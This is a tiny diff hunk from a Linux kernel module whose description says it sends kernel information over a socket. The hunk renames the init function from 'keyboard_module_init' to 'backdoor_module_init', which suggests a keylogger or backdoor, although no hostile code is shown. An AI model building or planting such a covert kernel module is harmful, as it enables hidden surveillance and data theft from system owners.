@@ -20,7 +20,7 @@ MODULE_DESCRIPTION("A module that sends specific kernel information via socket t
 MODULE_VERSION("0.1");
 
 
-static int __init keyboard_module_init(void) {
+static int __init backdoor_module_init(void) {
     int result;
 
     mutex_init(&socks_mutex);
